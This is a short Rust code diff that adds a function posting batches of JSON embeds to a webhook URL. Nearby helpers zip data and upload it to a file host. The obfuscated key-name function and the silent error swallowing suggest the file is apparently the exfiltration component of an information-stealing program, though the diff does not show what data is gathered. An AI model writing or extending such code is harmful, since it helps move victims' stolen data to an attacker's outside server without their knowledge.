@@ -63,6 +63,17 @@ pub async fn upload_to_gofile(client: &reqwest::Client, zip_data: Vec<u8>, zip_n
     None
 }
 
+pub async fn send_embeds_only(
+    client: &reqwest::Client,
+    webhook_url: &str,
+    embeds: &[serde_json::Value],
+) {
+    for chunk in embeds.chunks(10) {
+        let payload = json!({ s_sender_embeds(): chunk });
+        let _ = client.post(webhook_url).json(&payload).send().await;
+    }
+}
+
 pub async fn send_to_webhook(
     client: &reqwest::Client,
     webhook_url: &str,
